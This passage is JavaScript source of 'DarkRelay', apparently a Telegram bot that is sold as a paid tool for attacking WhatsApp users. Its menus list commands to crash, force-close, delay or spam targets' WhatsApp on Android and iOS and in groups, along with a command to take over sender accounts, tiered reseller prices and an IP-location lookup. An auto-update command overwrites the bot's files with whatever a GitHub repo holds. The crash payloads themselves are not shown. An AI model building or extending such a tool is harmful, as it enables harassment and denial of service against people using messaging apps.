                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
        {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5445221832074483553"
            },
         {
                text: "𝙏𝙊𝙊𝙇𝙎",
                callback_data: "/tools", style: "success", icon_custom_emoji_id: "5197371802136892976"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Kingarmufa", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/allinfoarmufa", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5260293700088511294"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5893257006323603821"
            }
        ],
        [
            {
                text: "𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔",
                callback_data: "/harga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            },
            {
                text: "𝗛𝗔𝗥𝗚𝗔 𝗨𝗣",
                callback_data: "/upharga", style: "danger", icon_custom_emoji_id: "5409048419211682843"
            }
        ],
        [
        {
                text: "𝗦𝗨𝗣𝗣𝗢𝗥𝗧",
                callback_data: "/tqto", style: "success", icon_custom_emoji_id: "5445221832074483553"
            },
         {
                text: "𝙏𝙊𝙊𝙇𝙎",
                callback_data: "/tools", style: "success", icon_custom_emoji_id: "5197371802136892976"
            }
        ],
        [
            {
                text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥",
                url: "https://t.me/Kingarmufa", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            },
            {
                text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟",
                url: "https://t.me/allinfoarmufa", style: "primary", icon_custom_emoji_id: "5807868868886009920"
            }
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝙏𝙊𝙊𝙇𝙎 𝗠𝗘𝗡𝗨 ⌟
┊✦ /testfunction - Tes Function 
┊✦ /tiktokdl - Download Tiktok 
┊✦ /ssiphone - Chat iPhone 
┊✦ /trackip - Cek Ip Wilayah 
┊✦ /hentai - Anime Hentai
┊✦ /asupan - Video Asupan 
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /ambilsender - Colong sender 
┊✦ /update - Update Script New versi
┊✦ /addprem - Add Premium Users
┊✦ /delprem - Delete Premium Users
┊✦ /addgroup - Add Premium Group
┊✦ /delgroup - Delete Premium Group
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

//CASE BUG ANDROID 
bot.action('/bug', async (ctx) => {
    const bugMenu = `<blockquote>╭╴⟬<tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> MURBUG • VVVIP ACCESS <tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="5798670723975221399">👑</tg-emoji> Android • Delay X Buldoz ⟡ <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> can spam
┊✦ /drxdelay - DarkRelay To Delay
┊✦ /drxblank - DarkRelay To Blank

<tg-emoji emoji-id="4956304066725545076">🍾</tg-emoji> Android • Forceclose ⟡ <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> invisible 
┊✦ /drxfcsw - Fc Status Wa
┊✦ /drxfcvis - Fc visible bug msg

<tg-emoji emoji-id="5891216553260617496">💎</tg-emoji> iOS • Delay Invisible ⟡ <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> can spam
┊✦ /fcios - DarkRelay To Forclose
┊✦ /ios - DarkRelay To Delay
────────────────────────────</blockquote>`;

    const keyboard = [
        [{
                text: "𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣",
                callback_data: "/buggroup", style: "primary", icon_custom_emoji_id: "5399904034406561469"
            }
        ],
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }],
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/buggroup', async (ctx) => {
    const bugMenu = `<blockquote>╭╴⟬<tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> MURBUG • VVVIP ACCESS <tg-emoji emoji-id="5424972470023104089">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="5395444784611480792">✏️</tg-emoji> Android • Bug Group ⟡ <tg-emoji emoji-id="6028551194861899805">🛡</tg-emoji> can spam
┊✦ /delaygroup - DarkRelay To Group Delay
────────────────────────────</blockquote>`;

    const keyboard = [
        [{
                text: "𝗕𝗨𝗚 𝗡𝗢𝗠𝗢𝗥",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5778313992036423586"
            }
        ],
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }],
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/harga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>✦••┈┈ - ʜᴀʀɢᴀ ꜱᴄ ᴅᴀʀᴋʀᴇʟᴀʏ - ┈┈••✦
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> FULL UP = 5.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> RESELLER = 20.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> OWNER = 40.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> ADMIN = 60.000
<tg-emoji emoji-id="5267400711322226107">🔪</tg-emoji> HIGH ADMIN = 80.000</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/upharga', async (ctx) => {
    const controlsMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜<tg-emoji emoji-id="5855216974904171412">🚀</tg-emoji> 𝙇𝙄𝙎𝙏 𝙐𝙋 𝙍𝙊𝙇𝙀 <tg-emoji emoji-id="5855216974904171412">🚀</tg-emoji>⌟
╔─═⊱ PRICE LIST MEMBER/VIP <tg-emoji emoji-id="4956420821116519533">🍨</tg-emoji>
┊✦ MEMBER »» VIP = 5.000
┊✦ MEMBER »» RESELLER = 10.000
┊✦ MEMBER »» OWNER = 20.000
┊✦ MEMBER »» ADMIN = 40.000
┊✦ MEMBER »» HIGH ADMIN = 60.000


╔─═⊱ PRICE LIST RESELLER <tg-emoji emoji-id="6190336264940559752">💰</tg-emoji>
┊✦ RESELLER »» OWNER = 10.000
┊✦ RESELLER »» ADMIN = 20.000
┊✦ RESELLER »» HIGH ADMIN = 40.000

╔─═⊱ PRICE LIST OWNER <tg-emoji emoji-id="6206319341487527808">👑</tg-emoji>
┊✦ OWNER »» ADMIN = 10.000
┊✦ OWNER »» HIGH ADMIN = 20.000


╔─═⊱ PRICE LIST ADMIN <tg-emoji emoji-id="6206220960966646470">💎</tg-emoji>
┊✦ ADMIN »» HIGH ADMIN = 10.000</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝙎𝙐𝙋𝙋𝙊𝙍𝙏 ⌟
┊ @fallxpn - Partner 
┊ @danzxnstore - My Friends 
┊ @rikyshopreal - Dev Website/Script 
┊ @Kingarmufa - Developer Utama
──────────────────────────</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝘼𝙇𝙇 𝙎𝙐𝙋𝙋𝙊𝙍𝙏 ⌟
┊ ⓘKedua orang tua gua
┊ ⓘMy Friends
┊ ⓘMy Partner
┊ ⓘAll Pelanggan
┊ ⓘAll Haters
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

////=========MENU UTAMA========\\\\
// Auto Update Repo + Report File

const Owner = "animationarmufa-oss";
const Repo = "DarkRelay-update-premium";
const Branch = "main";

const GITHUB_API = `https://api.github.com/repos/${Owner}/${Repo}/commits/${Branch}`;
let lastCommitSha = null;

async function getRepoFiles(dir = "") {
  const url = `https://api.github.com/repos/${Owner}/${Repo}/contents/${dir}?ref=${Branch}`;
  const res = await axios.get(url);

  let files = [];

  for (const item of res.data) {
    if (item.type === "file") {
      files.push(item);
    } else if (item.type === "dir") {
      const sub = await getRepoFiles(item.path);
      files = files.concat(sub);
    }
  }

  return files;
}

async function checkGithubUpdate(bot) {
  try {
    const res = await axios.get(GITHUB_API);
    const latestSha = res.data.sha;

    if (!lastCommitSha) {
      lastCommitSha = latestSha;
      return;
    }

    if (latestSha !== lastCommitSha) {
      lastCommitSha = latestSha;

      const message = `
🚀 UPDATE TERBARU TELAH TIBA!

📦 Repo sudah di update
⚡ Ketik /update untuk update terbaru
      `;

      // Perbaikan: ownerID bisa string atau array
      const owners = Array.isArray(ownerID) ? ownerID : [ownerID];
      for (const owner of owners) {
        await bot.telegram.sendMessage(owner, message);
      }

      console.log("✅ Update terdeteksi & notif terkirim");
    }
  } catch (err) {
    console.log("❌ Gagal cek update:", err.message);
  }
}

async function downloadFile(file) {
  const localPath = path.join(__dirname, file.path);
  const dir = path.dirname(localPath);

  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  const existed = fs.existsSync(localPath);

  const response = await axios({
    url: file.download_url,
    method: "GET",
    responseType: "stream",
  });

  const writer = fs.createWriteStream(localPath);
  response.data.pipe(writer);

  await new Promise((resolve, reject) => {
    writer.on("finish", resolve);
    writer.on("error", reject);
  });

  return existed ? "updated" : "new";
}

bot.command("update", checkOwner, async (ctx) => {
  try {
    await ctx.reply("🔄 Mengambil file dari GitHub...");

    const files = await getRepoFiles();

    const updated = [];
    const added = [];

    for (const file of files) {
      const result = await downloadFile(file);

      if (result === "updated") updated.push(file.path);
      if (result === "new") added.push(file.path);
    }

    let msg = "✅ Update selesai!\n\n";

    if (updated.length) {
      msg += "📥 File diperbarui\n";
      msg += updated.map(v => `• \`${v}\``).join("\n") + "\n\n";
    }

    if (added.length) {
      msg += "🆕 File baru\n";
      msg += added.map(v => `• \`${v}\``).join("\n");
    }

    await ctx.reply(msg, { parse_mode: "Markdown" });

    await ctx.reply("♻️ Bot restart...");

    setTimeout(() => process.exit(0), 3000);

  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Update gagal: " + err.message);
  }
});

bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
